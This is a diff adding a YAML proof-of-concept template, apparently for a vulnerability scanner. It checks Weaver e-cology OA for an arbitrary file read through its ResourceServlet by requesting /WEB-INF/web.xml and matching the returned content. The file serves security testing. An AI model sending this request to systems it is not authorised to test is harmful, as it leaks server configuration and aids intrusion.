@@ -1,0 +1,17 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-158983
+binding: 61a13d7c-9ad3-44b1-93d8-a7f8e622bb78
+detail:
+    author: system_user
+    vulnerability:
+        id: 3a6c0237-5b02-4d2d-9aac-3e307e3078f1
+        level: medium
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+expression: r0()
